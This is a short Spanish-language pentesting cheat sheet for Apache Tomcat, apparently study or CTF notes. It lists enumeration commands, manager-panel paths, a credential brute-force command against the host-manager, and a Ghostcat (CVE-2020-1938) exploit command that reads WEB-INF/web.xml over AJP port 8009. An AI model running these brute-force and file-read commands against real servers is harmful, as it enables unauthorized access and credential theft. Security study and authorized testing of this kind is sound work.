Apache Tomcat

Apache Tomcat suele exponer paneles de administración en puertos como 8080 y servicios AJP en 8009.

Enumeración

Versiones

whatweb -v <url>

Directorios sensibles

http://<ip>:8080/manager/
http://<ip>:8080/manager/html
http://<ip>:8080/host-manager/

Fuzzing web

gobuster dir -u http://<ip_target>:8180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

Fuerza bruta

mgr_brute.py

python mgr_brute.py -u <users.txt> -p <pass.txt> -U http://<ip>:8080/ -P host-manager/

Ghostcat: Tomcat 9.0.x, 8.5.x, 7.0.x (CVE-2020-1938)

Puerto 8009, servicio ajp13, versión Jserv. Este exploit permite leer archivos dentro de la carpeta de aplicaciones web, no archivos arbitrarios del sistema como /etc/passwd.

Leer WEB-INF/web.xml

python2.7 exploit.py <ip_target> -p 8009 -f WEB-INF/web.xml
